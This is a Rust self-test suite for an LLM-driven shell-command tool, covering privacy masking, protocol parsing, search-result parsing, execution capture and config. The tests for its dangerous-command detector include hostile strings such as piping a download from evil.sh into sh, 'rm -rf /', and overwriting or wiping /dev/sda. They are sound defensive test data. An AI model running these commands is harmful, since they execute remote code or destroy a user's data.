use crate::cache::cache_key;
use crate::config::{ApiStyle, MAX_RETRIES, Reasoning};
use crate::context::{
    Placeholders, apply_placeholders, collect_placeholders, gather_context, get_shell,
    mask_placeholders, shell_command,
};
use crate::danger::is_dangerous;
use crate::llm::{Message, RETRY_HINT};
use crate::protocol::{parse_check, parse_explore, parse_search, strip_markdown_fences};
use crate::style_label;
use crate::ui::{is_bare_cd, parse_candidates, truncate};
use crate::{
    AUTO_REFINE_MAX_OUTPUT_CHARS, ExecOutcome, auto_refine_body, auto_refine_output,
    auto_refine_step, parse_refine_command, refine_turns, should_auto_refine,
};

// ── Built-in self-test suite (`--test`) ─────────────────────────────────────

// std::env::set_var/remove_var are `unsafe fn` since Rust 2024 (they can race
// with env reads from other threads). run_tests is single-threaded and only
// touches the process env that it set up itself, so these are sound; the
// unsafe surface is confined to these two helpers.
fn set_env(key: &str, value: impl AsRef<std::ffi::OsStr>) {
    unsafe { std::env::set_var(key, value) }
}

fn unset_env(key: &str) {
    unsafe { std::env::remove_var(key) }
}

pub fn run_tests() {
    println!("Running comma self-tests...\n");
    let mut pass = 0;
    let mut fail = 0;

    let ph = collect_placeholders();
    let ctx = gather_context();

    // Helper
    let mut check = |name: &str, ok: bool| {
        if ok {
            println!("  ✓ {}", name);
            pass += 1;
        } else {
            println!("  ✗ {}", name);
            fail += 1;
        }
    };

    // Test 1: gather_context does NOT contain real username
    check("context does not leak username", !ctx.contains(&ph.user));

    // Test 2: gather_context does NOT contain real hostname
    check(
        "context does not leak hostname",
        !ctx.contains(&ph.hostname),
    );

    // Test 3: gather_context does NOT contain real home path
    check("context does not leak home path", !ctx.contains(&ph.home));

    // Test 4: apply_placeholders replaces {{USER}}
    let input = "cd /home/{{USER}}/docs";
    let output = apply_placeholders(input, &ph);
    let expected = format!("cd /home/{}/docs", ph.user);
    check(&format!("{{USER}} → {} ", ph.user), output == expected);

    // Test 5: apply_placeholders replaces {{HOSTNAME}}
    let input = "ssh {{HOSTNAME}}";
    let output = apply_placeholders(input, &ph);
    let expected = format!("ssh {}", ph.hostname);
    check(
        &format!("{{HOSTNAME}} → {} ", ph.hostname),
        output == expected,
    );

    // Test 6: apply_placeholders replaces {{HOME}}
    let input = "ls {{HOME}}/projects";
    let output = apply_placeholders(input, &ph);
    let expected = format!("ls {}/projects", ph.home);
    check(&format!("{{HOME}} → {} ", ph.home), output == expected);

    // Test 7: multiple placeholders in one string
    let input = "scp {{USER}}@{{HOSTNAME}}:{{HOME}}/file .";
    let output = apply_placeholders(input, &ph);
    let expected = format!("scp {}@{}:{}/file .", ph.user, ph.hostname, ph.home);
    check("multiple placeholders in one string", output == expected);

    // Test 8: no placeholders → unchanged
    let input = "ls -la";
    let output = apply_placeholders(input, &ph);
    check("no placeholders → unchanged", output == input);

    // Test 9: context contains non-private info
    check("context contains distro", ctx.contains("Distro:"));
    check("context contains kernel", ctx.contains("Kernel:"));
    check("context contains arch", ctx.contains("Arch:"));
    check("context contains shell", ctx.contains("Shell:"));
    // get_shell always falls back to /bin/sh (Unix) or cmd.exe (Windows)
    let shell_line = ctx
        .lines()
        .find(|l| l.starts_with("Shell: "))
        .unwrap_or("Shell: ");
    check(
        "shell value is non-empty",
        shell_line.len() > "Shell: ".len(),
    );
    check("context contains CWD", ctx.contains("CWD:"));
    check(
        "context contains packages",
        ctx.contains("Installed packages"),
    );
    // Standalone executables in user-local dirs (e.g. ~/.kimi-code/bin/kimi)
    check(
        "context contains user binaries",
        ctx.contains("User binaries"),
    );

    // Test 10: retry constants are sane
    check("MAX_RETRIES >= 2", MAX_RETRIES >= 2);
    check("MAX_RETRIES <= 5", MAX_RETRIES <= 5);
    check("RETRY_HINT is non-empty", !RETRY_HINT.is_empty());

    // Test 10b: API style parsing, URL auto-detection and labels
    check(
        "api_style: openai",
        ApiStyle::from_str("openai") == Some(ApiStyle::OpenAI),
    );
    check(
        "api_style: responses",
        ApiStyle::from_str("responses") == Some(ApiStyle::OpenAIResponses),
    );
    check(
        "api_style: openai-responses alias",
        ApiStyle::from_str("openai-responses") == Some(ApiStyle::OpenAIResponses),
    );
    check(
        "api_style: anthropic",
        ApiStyle::from_str("claude") == Some(ApiStyle::Anthropic),
    );
    check("api_style: unknown", ApiStyle::from_str("gemini").is_none());
    check(
        "api_style from_url: anthropic",
        ApiStyle::from_url("https://api.anthropic.com") == ApiStyle::Anthropic,
    );
    check(
        "api_style from_url: responses",
        ApiStyle::from_url("https://api.openai.com/v1/responses") == ApiStyle::OpenAIResponses,
    );
    check(
        "api_style from_url: default openai",
        ApiStyle::from_url("https://api.cerebras.ai/v1") == ApiStyle::OpenAI,
    );
    check(
        "style_label: responses",
        style_label(ApiStyle::OpenAIResponses) == "responses",
    );

    // Test 11: #EXPLORE: prefix detection
    check(
        "parse_explore: basic",
        parse_explore("#EXPLORE: openclaw --help") == Some("openclaw --help"),
    );
    check(
        "parse_explore: with spaces",
        parse_explore("  #EXPLORE: man ffmpeg  ") == Some("man ffmpeg"),
    );
    check(
        "parse_explore: no prefix",
        parse_explore("ls -la").is_none(),
    );
    check(
        "parse_explore: partial prefix",
        parse_explore("#EXPLOR ls").is_none(),
    );
    check(
        "parse_explore: just prefix",
        parse_explore("#EXPLORE:").is_none(),
    );

    // Test 12: #CHECK: prefix detection
    check(
        "parse_check: basic",
        parse_check("#CHECK: ripgrep fd bat") == Some(vec!["ripgrep", "fd", "bat"]),
    );
    check(
        "parse_check: single",
        parse_check("#CHECK: jq") == Some(vec!["jq"]),
    );
    check("parse_check: no prefix", parse_check("ls -la").is_none());
    check("parse_check: just prefix", parse_check("#CHECK:").is_none());
    // `|||` is the candidate separator of final commands; on a #CHECK: line it
    // must not survive as a tool name (it used to be probed with `which`).
    check(
        "parse_check: trailing ||| is a separator",
        parse_check("#CHECK: opencode |||") == Some(vec!["opencode"]),
    );
    check(
        "parse_check: ||| with repeated prefix",
        parse_check("#CHECK: a b ||| #CHECK: c") == Some(vec!["a", "b", "c"]),
    );
    check(
        "parse_check: ||| keeps order and dedupes",
        parse_check("#CHECK: b ||| a ||| b") == Some(vec!["b", "a"]),
    );
    check(
        "parse_check: bare pipes are dropped",
        parse_check("#CHECK: rg ||| |") == Some(vec!["rg"]),
    );
    check(
        "parse_check: comment still stripped",
        parse_check("#CHECK: rg fd # best tools") == Some(vec!["rg", "fd"]),
    );
    check(
        "parse_check: only separators",
        parse_check("#CHECK: |||").is_none(),
    );

    // Test 12b: #SEARCH: prefix detection
    check(
        "parse_search: basic",
        parse_search("#SEARCH: ffmpeg latest version") == Some("ffmpeg latest version".to_string()),
    );
    check(
        "parse_search: with spaces",
        parse_search("  #SEARCH: rust release  ") == Some("rust release".to_string()),
    );
    check("parse_search: no prefix", parse_search("ls -la").is_none());
    check(
        "parse_search: just prefix",
        parse_search("#SEARCH:").is_none(),
    );
    check(
        "parse_search: comment stripped",
        parse_search("#SEARCH: ffmpeg changelog # latest") == Some("ffmpeg changelog".to_string()),
    );

    // Test 12c: search config defaults and toggles
    let sc_default = crate::config::SearchConfig::default();
    check(
        "search config: default provider is off",
        sc_default.provider() == "off",
    );
    check("search config: disabled by default", !sc_default.enabled());
    check(
        "search config: default max_results is 5",
        sc_default.max_results() == 5,
    );
    let sc_ddg = crate::config::SearchConfig {
        provider: Some("duckduckgo".into()),
        ..Default::default()
    };
    check("search config: explicit provider enables", sc_ddg.enabled());
    let sc_clamp = crate::config::SearchConfig {
        max_results: Some(99),
        ..Default::default()
    };
    check(
        "search config: max_results clamped to 10",
        sc_clamp.max_results() == 10,
    );

    // Test 12d: DDG lite HTML parsing
    let ddg_html = r#"
<a rel="nofollow" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage&amp;rut=abc123" class='result-link'>Example Page</a>
<td class='result-snippet'>
  Some &lt;b&gt;snippet&lt;/b&gt; with <b>tags</b> and &#x27;entities&#x27;.
</td>
<a rel="nofollow" href="https://direct.example.org/" class='result-link'>Direct Link</a>
<td class='result-snippet'>Second &amp; snippet</td>
"#;
    let hits = crate::search::parse_ddg_lite(ddg_html, 5);
    check("ddg parse: 2 hits", hits.len() == 2);
    check("ddg parse: title decoded", hits[0].title == "Example Page");
    check(
        "ddg parse: uddg redirect unwrapped",
        hits[0].url == "https://example.com/page",
    );
    check(
        "ddg parse: snippet cleaned",
        hits[0].snippet == "Some <b>snippet</b> with tags and 'entities'.",
    );
    check(
        "ddg parse: direct url kept",
        hits[1].url == "https://direct.example.org/",
    );
    check(
        "ddg parse: max respected",
        crate::search::parse_ddg_lite(ddg_html, 1).len() == 1,
    );
    check(
        "ddg parse: garbage yields no hits",
        crate::search::parse_ddg_lite("<html></html>", 5).is_empty(),
    );
    check(
        "percent_decode: basic",
        crate::search::percent_decode("a%20b+c%3A%2F%2Fd") == "a b c://d",
    );
    check(
        "percent_decode: bad hex kept",
        crate::search::percent_decode("100%zz") == "100%zz",
    );
    check(
        "url_encode: space becomes plus",
        crate::search::url_encode("a b") == "a+b",
    );
    check(
        "url_encode: reserved encoded",
        crate::search::url_encode("a&b=c?") == "a%26b%3Dc%3F",
    );

    // Test 12f: write_auto_update_flag
    let pid = std::process::id();
    let tmp1 = std::env::temp_dir().join(format!("comma-test-autoupdate-{}.json", pid));
    std::fs::write(&tmp1, r#"{"model": "x", "cache_size": 100}"#).unwrap();
    check(
        "write_auto_update_flag: ok on existing",
        crate::config::write_auto_update_flag(&tmp1, false).is_ok(),
    );
    let data: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&tmp1).unwrap()).unwrap();
    check(
        "write_auto_update_flag: flag set",
        data["auto_update"] == false,
    );
    check(
        "write_auto_update_flag: keeps other keys",
        data["model"] == "x" && data["cache_size"] == 100,
    );
    let _ = std::fs::remove_file(&tmp1);
    let tmp2 = std::env::temp_dir().join(format!("comma-test-autoupdate-missing-{}.json", pid));
    let _ = std::fs::remove_file(&tmp2);
    check(
        "write_auto_update_flag: creates missing file",
        crate::config::write_auto_update_flag(&tmp2, false).is_ok()
            && std::fs::read_to_string(&tmp2)
                .unwrap()
                .contains("\"auto_update\": false"),
    );
    let _ = std::fs::remove_file(&tmp2);
    let tmp3 = std::env::temp_dir().join(format!("comma-test-autoupdate-bad-{}.json", pid));
    std::fs::write(&tmp3, "{not json").unwrap();
    check(
        "write_auto_update_flag: invalid json errors, file kept",
        crate::config::write_auto_update_flag(&tmp3, false).is_err()
            && std::fs::read_to_string(&tmp3).unwrap() == "{not json",
    );
    let _ = std::fs::remove_file(&tmp3);

    // Test 12e: Mojeek HTML parsing
    let moj_html = r#"
<li class="r1"><a title="https://nodejs.org/en" href="https://nodejs.org/en" class="ob"><p class="i"><span class="url">https://nodejs.org</span></p></a><h2><a class="title" title="https://nodejs.org/en" href="https://nodejs.org/en">Node.js — Run JavaScript Everywhere</a></h2><p class="s">Get Node.js® v24.18.0 Latest <strong>LTS</strong> release</p></li>
<li class="r2"><a title="https://example.com/x" href="https://example.com/x" class="ob"><p class="i"></p></a><h2><a class="title" title="https://example.com/x" href="https://example.com/x">Example &amp; Co</a></h2><p class="s">Second snippet</p><p class="more"><a href="/search?q=site%3Aexample.com">See more</a></p></li>
"#;
    let mhits = crate::search::parse_mojeek(moj_html, 5);
    check("mojeek parse: 2 hits", mhits.len() == 2);
    check(
        "mojeek parse: title",
        mhits[0].title == "Node.js — Run JavaScript Everywhere",
    );
    check("mojeek parse: url", mhits[0].url == "https://nodejs.org/en");
    check(
        "mojeek parse: snippet cleaned",
        mhits[0].snippet == "Get Node.js® v24.18.0 Latest LTS release",
    );
    check(
        "mojeek parse: entity in title",
        mhits[1].title == "Example & Co",
    );
    check(
        "mojeek parse: skips more-link",
        mhits[1].snippet == "Second snippet",
    );
    check(
        "mojeek parse: max respected",
        crate::search::parse_mojeek(moj_html, 1).len() == 1,
    );
    check(
        "mojeek parse: garbage yields no hits",
        crate::search::parse_mojeek("<html></html>", 5).is_empty(),
    );
    let hit = crate::search::SearchHit {
        title: "T".into(),
        url: "U".into(),
        snippet: "S".into(),
        page_text: None,
    };
    check(
        "format_hits: numbered",
        crate::search::format_hits(&[hit]) == "1. T\n   U\n   S",
    );
    let hit2 = crate::search::SearchHit {
        title: "T".into(),
        url: "U".into(),
        snippet: "S".into(),
        page_text: Some("full text".into()),
    };
    check(
        "format_hits: page content",
        crate::search::format_hits(&[hit2]) == "1. T\n   U\n   S\n   Page content:\n   full text",
    );
    // clipped_page_text: blank → None; long → char-boundary-safe truncation
    check(
        "clipped_page_text: blank is None",
        crate::search::clipped_page_text("   ").is_none(),
    );
    let long_cjk = "你".repeat(3100);
    let clipped = crate::search::clipped_page_text(&long_cjk).unwrap();
    check(
        "clipped_page_text: truncated to 3000 bytes",
        clipped.len() == 3000,
    );
    // Brave LLM Context parsing: snippets are plain strings of page content
    let brave_json = serde_json::json!({
        "grounding": { "generic": [
            { "url": "https://a.dev/x", "title": "A", "snippets": ["first chunk", "second chunk"] },
            { "url": "https://b.dev/y", "title": "B", "snippets": [] }
        ] }
    });
    let bhits = crate::search::parse_brave_llm_context(&brave_json, 5);
    check("brave llm-context: 2 hits", bhits.len() == 2);
    check("brave llm-context: url", bhits[0].url == "https://a.dev/x");
    check(
        "brave llm-context: snippet is first chunk",
        bhits[0].snippet == "first chunk",
    );
    check(
        "brave llm-context: page_text joins chunks",
        bhits[0].page_text.as_deref() == Some("first chunk\nsecond chunk"),
    );
    check(
        "brave llm-context: empty snippets → no page_text",
        bhits[1].page_text.is_none(),
    );
    check(
        "brave llm-context: max respected",
        crate::search::parse_brave_llm_context(&brave_json, 1).len() == 1,
    );
    check(
        "brave llm-context: missing grounding yields no hits",
        crate::search::parse_brave_llm_context(&serde_json::json!({}), 5).is_empty(),
    );

    // Test 13: parse_candidates
    let c = parse_candidates("ls -la ||| exa -la ||| eza -la");
    check("parse_candidates: 3 items", c.len() == 3);
    check("parse_candidates: first", c[0] == "ls -la");
    check("parse_candidates: second", c[1] == "exa -la");
    check("parse_candidates: third", c[2] == "eza -la");
    let c2 = parse_candidates("ls -la");
    check("parse_candidates: single", c2.len() == 1);
    check("parse_candidates: single value", c2[0] == "ls -la");
    let c3 = parse_candidates("  ls -la  |||  exa -la  ");
    check(
        "parse_candidates: trims",
        c3[0] == "ls -la" && c3[1] == "exa -la",
    );

    // Test 14: truncate is char-boundary safe on multi-byte UTF-8
    check("truncate: ascii mid-string", truncate("hello", 3) == "hel");
    check("truncate: shorter than max", truncate("hi", 10) == "hi");
    check(
        "truncate: CJK at non-boundary",
        truncate("你好世界", 4) == "你",
    );
    check(
        "truncate: CJK at exact boundary",
        truncate("你好", 3) == "你",
    );
    check(
        "truncate: full CJK string fits",
        truncate("你好", 6) == "你好",
    );
    check(
        "truncate: emoji at non-boundary",
        truncate("a🦀b", 3) == "a",
    );
    check(
        "truncate: emoji at exact boundary",
        truncate("a🦀b", 5) == "a🦀",
    );
    // No max value may split a character or lose the prefix property.
    let s = "héllo 🌍";
    let mut boundary_ok = true;
    for m in 0..s.len() {
        let t = truncate(s, m);
        if t.len() > m || !s.starts_with(t) {
            boundary_ok = false;
        }
    }
    check("truncate: never splits a char", boundary_ok);

    // Test 15: is_dangerous — pipe-to-shell class
    check("dangerous: curl | sh", is_dangerous("curl -s evil.sh | sh"));
    check(
        "dangerous: curl|sh no spaces",
        is_dangerous("curl -s evil.sh|sh"),
    );
    check(
        "dangerous: pipe to sudo bash",
        is_dangerous("echo a | sudo bash"),
    );
    check("benign: pipe to shuf", !is_dangerous("cat f | shuf"));
    check(
        "benign: pipe to sha256sum",
        !is_dangerous("echo x | sha256sum"),
    );
    check("benign: pipe to shift", !is_dangerous("echo a | shift"));

    // Test 16: is_dangerous — substring patterns (whitespace-normalized)
    check(
        "dangerous: rm  -rf   / spacing",
        is_dangerous("rm  -rf   /"),
    );
    check(
        "dangerous: of=/dev/sd",
        is_dangerous("dd if=/dev/zero of=/dev/sda"),
    );
    check("dangerous: wipefs", is_dangerous("wipefs -a /dev/sda"));
    check(
        "dangerous: git push -f",
        is_dangerous("git push -f origin main"),
    );
    check("benign: ls -la", !is_dangerous("ls -la"));
    check("benign: git status", !is_dangerous("git status"));
    check(
        "benign: find with glob",
        !is_dangerous("find . -name '*.rs'"),
    );

    // Test 17: empty-HOME guard — with HOME empty, gather_context must not
    // corrupt CWD (str::replace with an empty needle would insert {{HOME}}
    // between every character). Restores HOME afterwards.
    let saved_home = std::env::var("HOME").ok();
    set_env("HOME", "");
    let ctx_empty_home = gather_context();
    match &saved_home {
        Some(h) => set_env("HOME", h),
        None => unset_env("HOME"),
    }
    let cwd_line = ctx_empty_home
        .lines()
        .find(|l| l.starts_with("CWD: "))
        .unwrap_or("");
    check(
        "empty HOME: CWD not corrupted with {{HOME}}",
        !cwd_line.is_empty() && !cwd_line.contains("{{HOME}}"),
    );

    // Test 18: apply_placeholders with an empty home value still substitutes
    // cleanly (empty needle never reaches str::replace).
    let ph_empty = Placeholders {
        user: "u".into(),
        hostname: "h".into(),
        home: String::new(),
    };
    check(
        "apply_placeholders: empty home value",
        apply_placeholders("ls {{HOME}}", &ph_empty) == "ls ",
    );

    // Test 19: cache_key is per-model — the cache-first pass across the
    // fallback chain relies on distinct keys per model for identical messages.
    let msgs = [Message {
        role: "user".into(),
        content: "list files".into(),
    }];
    let key_a = cache_key("model-a", "sys", &msgs);
    check(
        "cache_key: differs per model",
        cache_key("model-b", "sys", &msgs) != key_a,
    );
    check(
        "cache_key: stable for identical input",
        cache_key("model-a", "sys", &msgs) == key_a,
    );

    // Test 20: COMMA_EVAL_FILE eval mode — execute() appends the
    // comment-stripped command (one line) to the file instead of spawning
    // a shell (no spawn can happen in this mode by construction).
    let eval_path = std::env::temp_dir().join(format!("comma-eval-test-{}", std::process::id()));
    let _ = std::fs::remove_file(&eval_path);
    set_env("COMMA_EVAL_FILE", &eval_path);
    crate::execute("cd /tmp # comment", false);
    unset_env("COMMA_EVAL_FILE");
    let eval_content = std::fs::read_to_string(&eval_path).unwrap_or_default();
    let _ = std::fs::remove_file(&eval_path);
    check(
        "eval file: comment-stripped command appended",
        eval_content == "cd /tmp\n",
    );

    // Test 20b: execute() contract — the exit code is always reported; in
    // COMMA_EVAL_FILE mode nothing runs here, so the outcome is None (and no
    // automatic refine can fire). Capture mode adds the combined output.
    let ok = crate::execute("exit 0", false);
    check(
        "execute: exit 0 reported",
        matches!(&ok, Some(o) if o.code == Some(0) && o.output.is_empty()),
    );
    let bad = crate::execute("exit 7", false);
    check(
        "execute: non-zero exit code reported",
        matches!(&bad, Some(o) if o.code == Some(7)),
    );
    set_env("COMMA_EVAL_FILE", &eval_path);
    let eval_outcome = crate::execute("cd /tmp", false);
    unset_env("COMMA_EVAL_FILE");
    let _ = std::fs::remove_file(&eval_path);
    check(
        "execute: eval-file mode returns None (no exit code)",
        eval_outcome.is_none(),
    );
    if cfg!(unix) {
        let captured = crate::execute("echo comma-capture-marker; exit 3", true);
        check(
            "execute: capture mode reports output + exit code",
            matches!(&captured, Some(o) if o.code == Some(3) && o.output.contains("comma-capture-marker")),
        );
        // The capture path must not cost the child its terminal: on Unix it runs
        // on a pty, so stdin/stdout/stderr are all TTYs (colors, progress bars
        // and full-screen programs keep working) — that is the whole point of
        // relaying instead of using `.output()`.
        let tty = crate::execute(
            "if [ -t 0 ] && [ -t 1 ] && [ -t 2 ]; then echo comma-on-pty; \
             else echo comma-on-pipes; fi; exit 0",
            true,
        );
        check(
            "execute: capture mode runs the child on a pty (tty on 0/1/2)",
            matches!(&tty, Some(o) if o.output.contains("comma-on-pty")),
        );
    }

    // Test 20b-2: the bounded capture buffer keeps the first and last bytes and
    // marks whatever it dropped, so an endless command cannot exhaust memory
    // while the summary still sees both ends of the output.
    let mut small = crate::pty::OutputCapture::default();
    small.push(b"short output");
    check(
        "capture buffer: short output is kept verbatim",
        small.finish() == "short output",
    );
    let mut chunked = crate::pty::OutputCapture::default();
    chunked.push(&vec![b'a'; 20 * 1024]);
    chunked.push(&vec![b'b'; 12 * 1024]);
    let under_cap = chunked.finish();
    check(
        "capture buffer: output under the cap is not marked as dropped",
        under_cap.len() == 32 * 1024 && !under_cap.contains("omitted"),
    );
    let mut huge = crate::pty::OutputCapture::default();
    huge.push(&vec![b'a'; 100 * 1024]);
    let bounded = huge.finish();
    check(
        "capture buffer: head+tail bounded, dropped middle marked",
        bounded.len() < 70 * 1024
            && bounded.starts_with("aaa")
            && bounded.ends_with("aaa")
            && bounded.contains("bytes of output omitted"),
    );

    // Test 20b-3: the portable pipe fallback (the Windows path, and what Unix
    // uses when a pty cannot be allocated) streams and captures the same way.
    if cfg!(unix) {
        let mut piped_cmd = std::process::Command::new("sh");
        piped_cmd.arg("-c").arg("echo comma-piped-marker; exit 4");
        let piped = crate::pty::run_piped(piped_cmd);
        check(
            "execute: piped fallback reports output + exit code",
            matches!(&piped, Ok(run) if run.code == Some(4) && run.output.contains("comma-piped-marker")),
        );
    }

    // Test 20c: automatic refine trigger — any non-zero exit code starts one,
    // including a signal death / spawn failure where code() is None; exit 0
    // never does, COMMA_EVAL_FILE mode never does, and `auto_refine: false`
    // (also the non-TTY one-shot path) always wins.
    let exit0 = ExecOutcome {
        code: Some(0),
        output: "ok".into(),
    };
    let exit1 = ExecOutcome {
        code: Some(1),
        output: "boom".into(),
    };
    let killed = ExecOutcome {
        code: None,
        output: String::new(),
    };
    check(
        "auto-refine: exit 0 does not trigger",
        !should_auto_refine(Some(&exit0), true),
    );
    check(
        "auto-refine: exit 1 triggers",
        should_auto_refine(Some(&exit1), true),
    );
    check(
        "auto-refine: signal / spawn failure (no code) triggers",
        should_auto_refine(Some(&killed), true),
    );
    check(
        "auto-refine: eval-file mode never triggers",
        !should_auto_refine(None, true),
    );
    check(
        "auto-refine: disabled switch wins",
        !should_auto_refine(Some(&exit1), false),
    );
    check(
        "auto-refine: non-TTY (one-shot) path never triggers",
        !should_auto_refine(Some(&killed), false),
    );

    // Test 20d: auto-refine payload — previous command + exit code + a
    // truncated output summary, with real private values masked BEFORE
    // truncation (a half-cut home path would still leak).
    let ph_fake = Placeholders {
        user: "tester".into(),
        hostname: "test-box".into(),
        home: "/home/tester".into(),
    };
    check(
        "mask_placeholders: home before user",
        mask_placeholders("/home/tester/x tester", &ph_fake) == "{{HOME}}/x {{USER}}",
    );
    check(
        "mask_placeholders: hostname",
        mask_placeholders("ssh test-box", &ph_fake) == "ssh {{HOSTNAME}}",
    );
    let ph_empty = Placeholders {
        user: String::new(),
        hostname: String::new(),
        home: "~".into(),
    };
    check(
        "mask_placeholders: skips empty values and the ~ fallback",
        mask_placeholders("~/x", &ph_empty) == "~/x",
    );

    let long_output = format!(
        "\u{1b}[31mcat: /home/tester/secret: No such file\u{1b}[0m\n{}",
        "x".repeat(4000)
    );
    let body = auto_refine_body("cat /home/tester/secret", 2, &long_output, &ph_fake);
    check(
        "auto-refine body: contains the failed command (masked)",
        body.contains("cat {{HOME}}/secret"),
    );
    check(
        "auto-refine body: contains the exit code",
        body.contains('2'),
    );
    check(
        "auto-refine body: no real home path",
        !body.contains("/home/tester"),
    );
    check(
        "auto-refine body: no real username",
        !body.contains("tester"),
    );
    check(
        "auto-refine body: no ANSI escapes",
        !body.contains('\u{1b}'),
    );
    check(
        "auto-refine body: placeholders substituted back",
        body.contains("{{HOME}}"),
    );
    let summary = auto_refine_output(&long_output, &ph_fake);
    check(
        "auto-refine summary: capped at the fixed limit",
        summary.chars().count() <= AUTO_REFINE_MAX_OUTPUT_CHARS,
    );
    check(
        "auto-refine summary: keeps the head",
        summary.starts_with("cat: {{HOME}}/secret"),
    );
    check(
        "auto-refine summary: keeps the tail",
        summary.ends_with("xxxx"),
    );
    check(
        "auto-refine summary: truncation is marked",
        summary.contains("chars omitted"),
    );
    let empty_expected =
        t!("interactive.auto_refine_body_empty", "cmd" => "false", "code" => 1).to_string();
    check(
        "auto-refine body: empty output sends command + exit code only",
        auto_refine_body("false", 1, "", &ph_fake) == empty_expected,
    );
    check(
        "auto-refine body: whitespace-only output counts as empty",
        auto_refine_body("false", 1, "  \n\t \u{1b}[0m", &ph_fake) == empty_expected,
    );

    // Test 20e: the request body of an automatic refine (the two turns the
    // next API call serializes) never contains the real HOME, username or
    // hostname — the project's #1 privacy invariant.
    let raw_reply = "ls -la {{HOME}}/docs".to_string();
    let real_output = format!(
        "total 4\n-rw-r--r-- {} {} {}: {}\n",
        ph.user, ph.user, ph.hostname, ph.home
    );
    let real_cmd = format!("ls -la {}/docs", ph.home);
    let real_body = auto_refine_body(&real_cmd, 1, &real_output, &ph);
    let turns = refine_turns(&raw_reply, &real_body);
    let request_body = serde_json::to_string(&turns).unwrap_or_default();
    check(
        "auto-refine request body: no real home path",
        !request_body.contains(&ph.home),
    );
    check(
        "auto-refine request body: no real username",
        !request_body.contains(&ph.user),
    );
    check(
        "auto-refine request body: no real hostname",
        !request_body.contains(&ph.hostname),
    );
    check(
        "auto-refine request body: placeholders present",
        request_body.contains("{{HOME}}") && request_body.contains("{{USER}}"),
    );

    // Test 20f: direct refine entry point at the main REPL prompt.
    check(
        "refine cmd: /refine TEXT",
        parse_refine_command("/refine make it safe") == Some("make it safe"),
    );
    check(
        "refine cmd: /r alias",
        parse_refine_command("/r use -y") == Some("use -y"),
    );
    check(
        "refine cmd: bare /refine yields empty text",
        parse_refine_command("/refine") == Some(""),
    );
    check(
        "refine cmd: whitespace trimmed",
        parse_refine_command("/refine   spaced  ") == Some("spaced"),
    );
    check(
        "refine cmd: /refinex is not a refine command",
        parse_refine_command("/refinex now").is_none(),
    );
    check(
        "refine cmd: /rx is not a refine command",
        parse_refine_command("/rx").is_none(),
    );
    check(
        "refine cmd: plain intent is not a refine command",
        parse_refine_command("list files").is_none(),
    );

    // Test 20g: the `auto_refine` config key — absent means enabled (default),
    // `false` disables (and keeps the streaming execution path). Uses a fake
    // HOME; skipped on Windows, where the config path is %APPDATA%\comma.
    if !cfg!(windows) {
        let fake = std::env::temp_dir().join(format!("comma-autorefine-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&fake);
        let cfg_file = fake.join(".config/comma/config.json");
        std::fs::create_dir_all(cfg_file.parent().unwrap()).unwrap();
        let saved_home = std::env::var("HOME").ok();
        let saved_xdg_cfg = std::env::var("XDG_CONFIG_HOME").ok();
        set_env("HOME", fake.to_string_lossy().as_ref());
        unset_env("XDG_CONFIG_HOME");
        std::fs::write(
            &cfg_file,
            r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m"}"#,
        )
        .unwrap();
        let default_on = crate::config::load_config()
            .map(|c| c.auto_refine)
            .unwrap_or(false);
        std::fs::write(
            &cfg_file,
            r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine":false}"#,
        )
        .unwrap();
        let disabled = crate::config::load_config()
            .map(|c| c.auto_refine)
            .unwrap_or(true);
        check("config: auto_refine defaults to true", default_on);
        check("config: auto_refine=false disables", !disabled);

        // Test 20h (g-014): the `auto_refine_rounds` key — default 3, `0`
        // disables, out-of-range values are clamped to 1-10, `auto_refine:
        // false` wins over the count, and an unusable value degrades to the
        // default without failing the whole config load. The effective value
        // is read through `auto_refine_limit()`.
        let rounds_cases: [(&str, &str, u32); 7] = [
            (
                "default (key absent)",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m"}"#,
                3,
            ),
            (
                "explicit 5",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":5}"#,
                5,
            ),
            (
                "0 = off",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":0}"#,
                0,
            ),
            (
                "42 clamps to 10",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":42}"#,
                10,
            ),
            (
                "-4 clamps to 1",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":-4}"#,
                1,
            ),
            (
                "auto_refine:false wins over 5",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":5,"auto_refine":false}"#,
                0,
            ),
            (
                "unusable string falls back to 3",
                r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","auto_refine_rounds":"nonsense"}"#,
                3,
            ),
        ];
        for (label, doc, want) in rounds_cases {
            std::fs::write(&cfg_file, doc).unwrap();
            let got = crate::config::load_config()
                .map(|c| c.auto_refine_limit())
                .unwrap_or(u32::MAX);
            check(
                &format!("config: auto_refine_rounds {} → {}", label, want),
                got == want,
            );
        }

        // Test 20j (g-005 att-003): `history` flipped from opt-in to ON by
        // default — the absent key persists REPL inputs, only an explicit
        // `false` keeps the disk untouched (that semantics must not change).
        std::fs::write(
            &cfg_file,
            r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m"}"#,
        )
        .unwrap();
        let history_default = crate::config::load_config()
            .map(|c| c.history)
            .unwrap_or(false);
        std::fs::write(
            &cfg_file,
            r#"{"base_url":"http://127.0.0.1","auth_token":"t","model":"m","history":false}"#,
        )
        .unwrap();
        let history_explicit_off = crate::config::load_config()
            .map(|c| c.history)
            .unwrap_or(true);
        check("config: history defaults to true", history_default);
        check(
            "config: explicit history=false still disables",
            !history_explicit_off,
        );

        match &saved_home {
            Some(v) => set_env("HOME", v),
            None => unset_env("HOME"),
        }
        match &saved_xdg_cfg {
            Some(v) => set_env("XDG_CONFIG_HOME", v),
            None => unset_env("XDG_CONFIG_HOME"),
        }
        let _ = std::fs::remove_dir_all(&fake);
    }

    // Test 20i (g-014): `auto_refine_rounds` parsing itself (pure, no
    // filesystem): missing or unusable → 3, `0` → 0 (= off), otherwise
    // clamped to 1-10 so a negative or oversized value can never produce more
